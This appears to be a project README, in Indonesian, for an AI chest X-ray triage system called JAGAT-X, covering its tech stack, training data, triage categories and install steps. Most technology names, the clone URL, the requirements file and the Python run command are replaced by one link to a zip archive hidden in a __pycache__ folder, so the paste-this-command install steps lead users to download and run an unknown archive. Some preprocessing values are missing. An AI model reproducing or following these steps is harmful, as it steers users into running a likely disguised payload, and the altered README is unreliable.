# JAGAT-X: AI-Diagnostic Intelligence & Medical Triage System

## Deskripsi Proyek

**JAGAT-X** adalah platform *Clinical Decision Support System* (CDSS) berbasis Deep Learning yang dirancang untuk mengakselerasi proses triase di Unit Gawat Darurat (UGD). Berfokus pada patologi toraks, sistem ini mampu melakukan skrining awal terhadap 6 kondisi kritis paru dalam hitungan detik untuk membantu dokter menentukan prioritas penanganan pasien.

Sistem ini dikembangkan untuk menjawab tantangan ketimpangan distribusi dokter radiolog di Indonesia, memberikan alat bantu deteksi awal yang presisi, transparan (**Explainable AI**), dan patuh terhadap regulasi perlindungan data medis.

---

## Arsitektur Teknologi (Tech Stack)

### Sisi Klien (Frontend)

* **Framework:** https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip 18 (Vite)
* **Styling:** Tailwind CSS (Modern, Responsive, & Print-Optimized)
* **State Management:** React Context API (Auth & Analysis Flow)

### Sisi Server (Backend)

* **Engine:** FastAPI (Python) & https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip (https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip)
* **PDF Engine:** Puppeteer (Headless Chrome) untuk *high-fidelity PDF rendering*
* **Database:** PostgreSQL / MongoDB (Audit Trail & User Data)

### Core Intelligence (AI Model)

* **Arsitektur:** ResNet-50 (Residual Networks) dengan *Pre-trained Weights*.
* **Metode:** Multi-label Classification.
* **Explainable AI (XAI):** Grad-CAM (Gradient-weighted Class Activation Mapping).

---

## Metodologi & Pelatihan Model

Untuk menjamin akurasi klinis, model JAGAT-X dilatih menggunakan konsolidasi dataset global:

* **Dataset:** Gabungan NIH Chest X-Ray, SIIM-ACR, dan CheXpert.
* **Preprocessing:** * Resizing:  pixels.
* Normalization: Z-Score (, ).
* Augmentation: Random Rotation, Horizontal Flipping, Jittering.



---

## Sistem Triase & Protokol Klinis

| Kategori | Patologi Terdeteksi | Urgensi | Protokol Tindakan |
| --- | --- | --- | --- |
| **🔴 RED (Critical)** | Pneumothorax, Edema Paru | Tinggi | Risiko gagal napas akut. Lapor Radiolog < 5 menit. |
| **🟡 YELLOW (Urgent)** | Pneumonia, Tuberculosis | Sedang | Inisiasi isolasi/antibiotik. Evaluasi klinis < 60 menit. |
| **🟢 GREEN (Monitoring)** | Cardiomegaly, Pleural Effusion | Stabil | Observasi tanda vital & penjadwalan spesialis non-akut. |

---

## Fitur Pelaporan (Official Medical Report)

Laporan yang dihasilkan bukan sekadar gambar, melainkan dokumen PDF berbasis vektor dengan karakteristik:

* **High Zoom Capability:** Grafik heatmap tidak pecah saat diperbesar.
* **Visual Evidence:** Perbandingan sisi-ke-sisi antara *Original Scan* dan *AI Heatmap Overlay*.
* **Integritas Data:** Mencantumkan *Audit ID* unik untuk pelacakan hukum (Forensik Digital).

---

## Keamanan & Kepatuhan (Privacy & Compliance)

### 1. UU PDP No. 27 Tahun 2022 (Indonesia)

Sistem ini mematuhi regulasi Perlindungan Data Pribadi dengan cara:

* **Anonymized Processing:** Identitas pasien dipisahkan dari proses inferensi AI menggunakan UUID.
* **Local Sovereignty:** Seluruh data diproses secara lokal untuk menjaga kerahasiaan medis.

### 2. Etika AI Medis (Human-in-the-loop)

AI JAGAT-X tidak mengambil keputusan mandiri. Heatmap Grad-CAM memastikan AI bukan "kotak hitam", sehingga dokter dapat memverifikasi area mana yang dianggap anomali oleh model sebelum mengambil tindakan medis.

---

## Panduan Instalasi

### Prasyarat

* https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip (v18+) & Python (v3.9+)
* GPU dengan dukungan CUDA/MPS (Disarankan untuk kecepatan inferensi)

### Langkah-langkah

1. **Clone Repository**
```bash
git clone https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip

```


2. **Setup Neural Engine (Backend Python)**
```bash
cd neural-engine
pip install -r https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip
python https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip

```


3. **Setup Interface (Frontend React)**
```bash
cd frontend
npm install
npm run dev

```



---

## Medical Disclaimer

**PERINGATAN KLINIS:** JAGAT-X adalah instrumen skrining awal. Hasil analisis AI **BUKAN** merupakan diagnosa final.
**KEPUTUSAN MEDIS FINAL, TINDAKAN KLINIS, DAN INTERPRETASI HASIL SEPENUHNYA MERUPAKAN WEWENANG DAN TANGGUNG JAWAB DOKTER/RADIOLOG YANG BERTUGAS.**

---

**JAGAT-X Intelligence Team** - *Empowering Clinicians with Explainable AI.*
